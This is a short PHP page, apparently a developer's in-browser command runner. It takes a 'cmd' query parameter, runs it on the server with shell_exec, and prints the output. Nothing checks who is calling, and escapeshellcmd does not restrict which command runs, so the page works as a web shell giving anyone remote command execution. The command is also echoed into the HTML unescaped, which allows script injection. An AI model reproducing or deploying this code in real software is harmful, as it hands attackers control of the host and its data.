<?php
  $cmd=isset($_GET['cmd']) ? $_GET['cmd'] : 'python test.py a b c d';
  $cmd=escapeshellcmd($cmd);
?>

<!--shell prompt-->
<form method=GET>
<input name=cmd id=cmd value="<?php echo $cmd?>" placeholder="write command here" style="width:50%">
</form>

<!--input-->
<?php echo "<h2><code>&gt; $cmd</code></h2>"?>

<!--output-->
<pre><code>
<?php 
  $result=shell_exec($cmd); 
  echo $result;
?>
</pre></code>

<!--focus on cmd prompt-->
<script>document.querySelector('#cmd').select();</script>
